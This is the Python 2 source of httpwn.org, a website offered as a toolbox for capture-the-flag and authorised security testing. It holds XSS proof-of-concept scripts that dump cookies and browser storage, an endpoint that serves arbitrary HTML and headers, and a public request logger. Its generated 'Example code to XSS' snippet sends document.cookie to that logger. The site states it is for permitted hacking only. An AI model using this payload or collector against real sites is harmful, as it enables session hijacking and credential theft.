#httpwn.org
#Copyright (C) 2016  Bram Staps
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU Affero General Public License as
#published by the Free Software Foundation, either version 3 of the
#License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU Affero General Public License for more details.
#
#You should have received a copy of the GNU Affero General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
def _sites(sites, ALL, GET, POST, compile):
    sites.append((GET, compile("^/$"), ALL, mainsite))
    sites.append((GET, compile("^/style.css$"), ALL, css))
    sites.append((GET, compile("^/robots.txt$"), ALL, robots))
    sites.append((ALL, compile("^/walloffame$"), ALL, walloffame))
    sites.append((ALL, compile("^/myip$"), ALL, my_ip))
    sites.append((GET, compile("^/statement$"), ALL, statement))
    sites.append((GET, compile("^/tools$"), ALL, tools))
    sites.append((ALL, compile("^/settings(/.*)?$"), ALL, usersettings))
    sites.append((GET, compile("^/myrequest(/.*)?$"), ALL, feedback_url))
    sites.append((GET, compile("^/logrequest(\\?.*)?$"), ALL, log_request))
    sites.append((GET, compile("^/htmldisplay/"), ALL, htmldisplay))
    sites.append((GET, compile("^/readrequest$"), ALL, requestlog))
    sites.append((GET, compile("^/xss/[a-z]+\\.js$"), ALL, xss))

import sys
from StringIO import StringIO
from site_constructs import *
#from settings import settings

def xss(fd, method, url, version, headers, lines):
    print >>fd, "Connection: close"
    print >>fd, "Content-Type: application/javascript"
    static_cache_headers(fd)
    if method == "HEAD": return
    
    name = url.split("/")[-1]
    if name == "jar.js":
        print >>fd, """
            alert(document.cookie);
        """
    elif name == "localstorage.js":
        print >>fd, """
            string = ""

            for(var i in localStorage)
            {
                string = string + i + " : \\'" + localStorage[i] + "\\'\\n"
            }
            alert(string);
        """  
    elif name == "sessionstorage.js":
        print >>fd, """
            string = ""

            for(var i in sessionStorage)
            {
                string = string + i + " : \\'" + sessionStorage[i] + "\\'\\n"
            }
            alert(string);
        """  
    return fd.getvalue()
    

def tools(fd, method, url, version, headers, lines):
    html_headers(fd)
    static_cache_headers(fd)
    print >>fd, ""
    print >>fd, """
    <textarea id="content" style="width:calc(100% - 350px);height:100%;float:right;"></textarea>
    <script>
        handle = document.getElementById("content");

        function getContent()
        {
            return handle.value;
        }

        function setContent(content)
        {
            handle.value = content;
        }

        function applyFunction(f)
        {
            setContent(f(getContent()));
        }

        function toHex(text)
        {
            var newText = "";
            for(var i in text)
            {
                var newCode = text.charCodeAt(i).toString(16);
                if (newCode.length < 2) newCode = "0" + newCode;
                newText += newCode;
            }

            return newText;
        }

        function fromHex(text)
        {
            var newText = "";
            for(i = 0; i < text.length; i += 2)
            {
                newText += String.fromCharCode( parseInt(text.substring(i,i+2), 16) );
            }

            return newText;
        }


    </script>

    <div style="width:300px; text-align:center;">
        <input type="submit" value="Encode" onclick="applyFunction(encodeURIComponent);" style="float:left"/>
        <input type="submit" value="Decode" onclick="applyFunction(decodeURIComponent);" style="float:right"/>
        Urlencoding<br>

        <br>    
        <input type="submit" value="Encode" onclick="applyFunction(window.btoa);" style="float:left"/>
        <input type="submit" value="Decode" onclick="applyFunction(window.atob);" style="float:right"/>
        Base 64<br>

        <br>    
        <input type="submit" value="Encode" onclick="applyFunction(toHex);" style="float:left"/>
        <input type="submit" value="Decode" onclick="applyFunction(fromHex);" style="float:right"/>
        Hex<br>
    </div>
    """
    prologue(fd, metadata["schema"])
    epilogue(fd)

def usersettings(fd, method, url, version, headers, lines):
    # if plain http we break earyl and redirect

    if method == "POST":
        if not is_secure(metadata["socket"]):
            exit()

        try:
            code = int(lines[-1])
        except:
            quit() #again if you try to break it, You dont get an answer        

        plaintext_headers(fd)
        
        whitelist = ["http://%s" % settings["servername"], "https://%s" % settings["servername"]]

        if "Origin" in headers:
            if headers['Origin'] in whitelist:
                print >>fd, "Access-Control-Allow-Origin: %s" % headers['Origin']
            else:
                exit() #And here we are sure someone is being naughty

        if (code == 0):
            print >>fd, "Strict-Transport-Security: max-age=0"
        elif (code == 1):
            print >>fd, "Strict-Transport-Security: max-age=%s" % settings["httpsecuritytimeout"]
        elif (code == 2):
            print >>fd, "Public-Key-Pins: pin-sha256=\"%s\"; pin-sha256=\"%s\"; max-age=0; includeSubDomains" % (settings["HPKPkey1"], settings["HPKPkey2"])
        elif (code == 3):
            print >>fd, "Public-Key-Pins: pin-sha256=\"%s\"; pin-sha256=\"%s\"; max-age=%s; includeSubDomains" % (settings["HPKPkey1"], settings["HPKPkey2"], settings["httpsecuritytimeout"])
        elif (code == 4):
            print >>fd, "Set-Cookie: protection=0; Max-Age=0"
        elif (code == 5):
            print >>fd, "Set-Cookie: protection=1; Max-Age=%s" % settings["httpsecuritytimeout"]
            

        print >>fd, ""
        print >>fd, "1"
        return


    if is_secure(metadata["socket"]):
        html_headers(fd)
    else:
        plaintext_headers(fd) #if not secure

    static_cache_headers(fd)
    print >>fd, ""

    if method == "HEAD": return

    if not is_secure(metadata["socket"]):
        print >>fd, "This page is only available in https" #if not secure
        return #if not secure

    prologue(fd, metadata["schema"])
    print >>fd, """
        <script>
            function postRequest(code)
            {
                var request = new XMLHttpRequest();
                url = 'https://httpwn.org/settings';
                request.open('POST', url, true);
                request.onreadystatechange = function() {
                    if (request.readyState == 4) {
                        if (request.response)
                        {
                            color = (code & 1) ? "#090" : "#900";
                            document.getElementById(code).style.backgroundColor = color;
    
                            otherCode = code & 1 ^ 1 + (code & 254); //will work until we make a LOT of buttons
                            document.getElementById(otherCode).style.backgroundColor = "#000";
                        }
                    }
                }
                request.send(code);
            }            
        </script>

        <div>
            <div class="noborder" style="padding-bottom:10px;">Exploit protection: <input type="button" id="5" onclick="postRequest('5');" value="Enable" /> <input class="red" type="button" id="4" onclick="postRequest('4');" value="Disable" /> TODO: Block the red links on this site for you. (For your current connection only (http OR https))</div>
            <div class="noborder" style="padding-bottom:10px;">HSTS lock-in: <input type="button" id="1" onclick="postRequest('1');" value="Enable" /> <input class="red" type="button" id="0" onclick="postRequest('0');" value="Disable" /> You can only reacht this site via https.</div>
            <div class="noborder" style="padding-bottom:30px;">HPKP lock-in: <input type="button" id="3" onclick="postRequest('3');" value="Enable" /> <input class="red" type="button" id="2" onclick="postRequest('2');" value="Disable" /> Pins the certificates used on this site</div> 
            <div class="noborder">Full protection: <input type="button" onclick="postRequest('1');postRequest('3');postRequest('5');" value="Enable" /> <input class="red" type="button" onclick="postRequest('0');postRequest('2');postRequest('4');" value="Disable" /></div>
        </div>

    """
    epilogue(fd)


def my_ip(fd, method, url, version, headers, lines):
    plaintext_headers(fd)
    no_cache_headers(fd)
    print >>fd, ""
    if method == "HEAD": return
    print >>fd, get_ip(metadata["socket"]) 


def feedback_url(fd, method, url, version, headers, lines):
    plaintext_headers(fd)
    no_cache_headers(fd)
    print >>fd, ""
    if method == "HEAD": return
    print >>fd, "%s:%s\n" %(get_ip(metadata["socket"]),get_port(metadata["socket"]))
    print >>fd, "\n".join(lines)


def log_request(fd, method, url, version, headers, lines):
    try:
        parse_cookies(headers["Cookie"])["protection"] #if this does not break youre safe (protection cookie exists)
        return
    except:
        pass

    lines = ["---------- %s:%s @ %f ----------" % (get_ip(metadata["socket"]), get_port(metadata["socket"]), time())] + lines + ["-----------------------------------------------------"]
    no_cache_headers(fd)    
    raw_text = "\n".join(lines).strip()
    with open(settings["requestlogpath"], "a") as f:
        f.write("%s\n" % raw_text)
    print >>fd, "HTTP/1.1 200 OK"
    print >>fd, "Connection: close"
    print >>fd, ""


def requestlog(fd, method, url, version, headers, lines):
    with open(settings["requestlogpath"], "r+") as f:
        data = f.read()
    
    plaintext_headers(fd)
    revalidate_cache_headers(fd)
    
    print >>fd, ""
    if method == "HEAD": return
    print >>fd, data


#special case and if you head this one youre out of luck
def htmldisplay(fd, method, url, version, headers, lines):
    try:
        parse_cookies(headers["Cookie"])["protection"] #if this does not break youre safe (protection cookie exists)
        return
    except:
        pass

    data = url[len("/htmldisplay/"):]
    un_data = unquote(data)
    print >>fd, un_data


def robots(fd, method, url, version, headers, lines):
    plaintext_headers(fd)
    static_cache_headers(fd)
    print >>fd, ""
    if method == "HEAD": return
    print >>fd, "User-agent: *"
    print >>fd, "Disallow: /logrequest"
    print >>fd, "Disallow: /htmldisplay/"
    print >>fd, ""


#style sheet
def css(fd, method, url, version, headers, lines):
    print >>fd, "Connection: close"
    print >>fd, "Content-Type: text/css"
    static_cache_headers(fd)
    print >>fd, ""
    if method == "HEAD": return
    print >>fd, """
/* I have no style */
*
{
    font-family: monospace;
    font-color: #0F0;
    font-size: 12pt;
    color: #0F0;
    background-color:black;
}
div
{
    border: 1px solid #0F0;
    padding: 10px;
}

input
{
    border: 1px solid #0F0;
}

textarea
{
    border: 1px solid #0F0;
}

a:hover
{
    text-decoration: underline;
}

a
{
    text-decoration: none;
}
.noborder
{
    border: none; 
    padding: 0px;
}
.red
{
    border-color: #F00;
    font-color: #F00;
    color: #F00;
}
.red a
{
    border-color: #F00;
    font-color: #F00;
    color: #F00;
}
.yellow
{
    border-color: #FF0;
    font-color: #FF0;
    color: #FF0;
}
.yellow a
{
    border-color: #FF0;
    font-color: #FF0;
    color: #FF0;
}
"""


def walloffame(fd, method, url, version, headers, lines):
    html_headers(fd)
    static_cache_headers(fd)
    print >>fd, ""
    prologue(fd, metadata["schema"])
    print >>fd, """
        <div>
            <ul>
                <li>
                    Christiaan O.
                    <ul style="list-style:none;"><li>Noticed that dropping root rights would be a good idea.</li></ul>
                </li><br>
                <li>
                    Frank E.
                    <ul style="list-style:none;"><li>Noticed that the Html Display could be use to exploit users of this site (eg: by revoking their HSTS aand HPKP headers).</li></ul>
                </li>
            </ul>
        </div>
    """
    epilogue(fd)


def statement(fd, method, url, version, headers, lines):
    html_headers(fd)
    static_cache_headers(fd)
    print >>fd, ""
    if method == "HEAD": return
    prologue(fd, metadata["schema"])
    print >>fd, """
    <div>
        <p>This website is meant as a fun exercise and toolbox for white-hat hackers to solve challenges on other sites or maybe even find a hole in this one.</p>
        <p>As long as you restrict yourself ONLY to the webserver (software running on port 80 &amp 443) and website logic you have my permission to try to find holes in the security IF you responsibly disclose them to me.
        This server runs on a VM which I rent so mind your scope. I'm the technical contact of this domain so you can find my e-mail there. hint: 'whois httpwn.org | grep "Admin Email:"'</p>
        <p>Finally, the software runnig this website is on github: <a href="https://github.com/warsocket/httpwn">https://github.com/warsocket/httpwn</a> So feel free to review the code and / or collaborate.</p>
    </div>
    """
    epilogue(fd)


def mainsite(fd, method, url, version, headers, lines):

    reverse_proto = ["https","http"][is_secure(metadata["socket"])]
    server_name = settings["servername"]

    try:
        ipv4_server_name = settings["ipv4dnsrecord"]
    except:
        ipv4_server_name = settings["servername"]
    
    try:
        ipv6_server_name = settings["ipv6dnsrecord"]
    except:
        ipv6_server_name = settings["servername"]
    


    protocol_name = proto_name(metadata["socket"])

    lock_img = ["""
    <svg width="39" height="63">
        <g
            transform="scale(1.1)"
            scale=""
        >
            <rect
                style="fill:#ff0000"
                id="rect3342"
                width="35"
                height="30"
                x="0.15664554"
                y="26.904453" 
            />
            <path
                style="fill:#ff0000"
                d="M 17.642411,0.14466496 A 15,15 0 0 0 2.6424112,15.144635 l 0,5 5,0 0,-5 a 10,10 0 0 1 9.9999998,-10 10,10 0 0 1 10,10 l 0,5 5.000001,0 0,-5 A 15,15 0 0 0 17.642411,0.14466496 Z"
            />
        </g>
    </svg>
""",
"""    <svg width="39" height="63">
        <g
            transform="scale(1.1)"
            scale=""
        >
            <rect
                style="fill:#00ff00"
                id="rect3342"
                width="35"
                height="30"
                x="0.15664554"
                y="26.904453" 
            />
            <g
                transform="translate(0,6)"
            >
                <path
                    style="fill:#00ff00"
                    d="M 17.642411,0.14466496 A 15,15 0 0 0 2.6424112,15.144635 l 0,5 5,0 0,-5 a 10,10 0 0 1 9.9999998,-10 10,10 0 0 1 10,10 l 0,5 5.000001,0 0,-5 A 15,15 0 0 0 17.642411,0.14466496 Z"
                />
            </g>
        </g>
    </svg>"""]

    html_headers(fd)
    static_cache_headers(fd)
    print >>fd, ""
    if method == "HEAD": return
    #CUstom header
    print >>fd, """
<html>
<head>
<title>Htt(p)wnage tool</title>
<link href="style.css" rel="stylesheet" type="text/css">
<script>

function hide(obj)
{
    document.getElementById(obj).style.display = 'none';
}

function show(obj)
{
    document.getElementById(obj).style.display = 'block';
}

function clearDiv()
{
    document.getElementById('tip').innerHTML = '';
}

function setTip(tip, select=false)
{
    div = document.getElementById('tip');
    div.innerHTML = tip;

    if (select)
    {
        if (document.body.createTextRange)
        {
            range = document.body.createTextRange();
            range.moveToElementText(div);
            range.select();
        } 
        else if (window.getSelection) 
        {
            selection = window.getSelection();        
            range = document.createRange();
            range.selectNodeContents(div);
            selection.removeAllRanges();
            selection.addRange(range);
        }
    }
}

function hideAll()
{
    divsToHide = new Array("htmldisplaytool");
    for (i in divsToHide)
    {
        hide(divsToHide[i]);
    }
}
</script>
</head>
<body style="min-width:1000px">

<div class="noborder" id="warning">
Hello there, this site contains a nice slection of tools for hacking purposes. 
<b>By using this site you agree you will only use these tools for hacking challenges and / or other test where you have explicit permission from the owner to perform them.</b>
The red part are links for targets, so if you dont intend to be one don't click them.
The green part are tools you can use. <input type="button" value="Hide" onclick="hide('warning'); document.cookie='hide=1;'" />
</div>


<div style="text-align:center">
<a href="%s://httpwn.org" style="text-decoration: none">%s</a>
    <font style="font-size:500%%">%s</font>
</div>

<br>

<div id="htmldisplaytool" style="display:none;">

    <input type="text" value="HTTP/1.1 200 OK" style="width:100%%;" readonly="readonly">

<textarea style="width:100%%;height:75px" id="headers">
Connection: close
Content-Type: text/html
</textarea> 

    <br>

<textarea style="width:100%%;height:200px" id="content">
<html>
    <head>
        <script>
            alert("Hello, welcome to '%s'");
        </script>
    </head>
    <body />
</html>
</textarea>
    <script>
        function apply()
        {
            setTip( '%s' + '://' + '%s' + '/htmldisplay/' + encodeURIComponent( document.getElementById("headers").value) + "%%0A" + encodeURIComponent(document.getElementById("content").value), true );
        }
    </script>
    <input type="button" value="Generate" onclick="apply();" />  <input type="button" value="Hide" onclick="hideAll();"/>

</div>

<div id="tip" style="height:100pt;">
</div>

<br>

<script>
    cookies = document.cookie.split(";");
    for (i in cookies)
    {6
        if (cookies[i].trim() === "hide=1") document.getElementById('warning').style.display = "none";
    }
</script>

<table style="width:100%%;margin-left:auto;margin-right:auto;table-layout:fixed;">
    <tr>
        <td valign="top">
            <div style="margin-right:10px">
                <div class="noborder" style="text-align:center;">
                    <b><font>Server-side readout</font></b>
                </div>
                <br>
                <div class="noborder" style="text-align:right">
                    My <a href="/myip" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('You can use this link (in an automated way) to determine your WAN IP (you browser / software chooses between IPv4 and IPv6, if you are not on a IPv4/IPV6 forced domain). all HTTP methods are supported (GET/POST/etc).')">IP</a> <a class="yellow" href="http://%s/myip" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('You can use this link (in an automated way) to determine your WAN IPv4. all HTTP methods are supported (GET/POST/etc).')">IPv4</a> <a class="yellow" href="http://%s/myip" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('You can use this link (in an automated way) to determine your WAN IPv6. all HTTP methods are supported (GET/POST/etc).')">IPv6</a><br>
                    <a href="/myrequest" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Check what kind of request your browser is sending to this site, including headers and http-method.')">My request</a><br>
                    <a href="/readrequest" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Read all requsts made by the request logger')">Read logged requests</a><br>
                    <br>
                    <a href="/xss/jar.js" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Cookies XSS POC: a JavaScript file to inlcude which displays all cookies<br>For use on environments with restricted XSS capabilities')">cookies</a> <a href="/xss/localstorage.js" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('localStorage XSS POC, a JavaScript file to inlcude which displays all localStorage variables<br>For use on environments with restricted XSS capabilities')">local</a> <a href="/xss/sessionstorage.js" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('sessionStorage XSS POC, a JavaScript file to inlcude which displays all sessionStorage variables<br>For use on environments with restricted XSS capabilities')">session</a><br>
                    <br>
                    <br>
                    <a href="https://%s/settings" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Set some nice cookie sand other headers for using this site.')">User settings</a><br>                   
                </div>    
            </div>
        </td>
        <td valign="top">
            <div class="red" style="margin-left:10px;margin-right:10px;">
                <div class="noborder" style="text-align:center;">
                    <b><font class="red">Exploitation url examples</font></b>
                </div>
                <br>
                <div class="red noborder" style="text-align:center;">
                    <br>
                    <br>
                    <a href="/logrequest?q=SESSIONID%%3Dsecret" onmouseout="clearDiv()" onmouseover="setTip('Nice logging facility that logs all requests being made')">Log requests</a><br>
                    <a href="/htmldisplay/Connection%%3A%%20close%%0AContent-Type%%3A%%20text%%2Fplain%%0A%%0Aplain%%20text%%20example" onmouseout="clearDiv()" onmouseover="setTip('Serve a page of your chosing, inlcuding customisable HTTP headers (This example displays some text)')">Html diplay</a><br>
                    <br>
                    <br>
                    <a href="http://127.0.0.1.dns.httpwn.org" onmouseout="clearDiv()" onmouseover="setTip('localhost DNS name')">IPv4 localhost DNS name</a><br>
                    <br>
                </div>
            </div>
        </td>
        <td valign="top">
            <div style="margin-left:10px">
                <div class="noborder" style="text-align:center;">
                    <b><font>Convenient generators</font></b>
                </div>
                <br>
                <div class="noborder" style="text-align:left;">
                    <br>
                    <br>
                    <script>
                        function xssTip()
                        { 
                            setTip('&ltscript&gt<br>var i = new Image();<br>i.src = "%s://%s/logrequest?q=" + escape(document.cookie);<br>&lt/script&gt', true);
                        }
                    </script>
                    <a href="#" onclick="hideAll();xssTip();">Example code to XSS<br>
                    <a href="#" onclick="hideAll();setTip('');show('htmldisplaytool');">Generate Html display url<br>
                    <br>
                    <a href="tools" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Page to en/decode various stuff');">En/Decoder tool<br>
                    <a href="#" onclick="hideAll();setTip('.dns.httpwn.org', true);">DNS epilogue<br>
                    <br>
                </div>                
            </div>
        </td>
    </tr>
</table>
<br>
<br>
<div class="noborder" style="text-align:center;">
    <a href="/walloffame" target="_blank">Wall of fame</a><br><br>
    <a href="/statement" target="_blank" style="color:#050;">About this site, resposible disclosure and github.</a>
</div>
""" % (reverse_proto, lock_img[is_secure(metadata["socket"])], server_name, server_name, protocol_name, server_name, ipv4_server_name, ipv6_server_name, server_name, protocol_name, server_name)
    epilogue(fd)
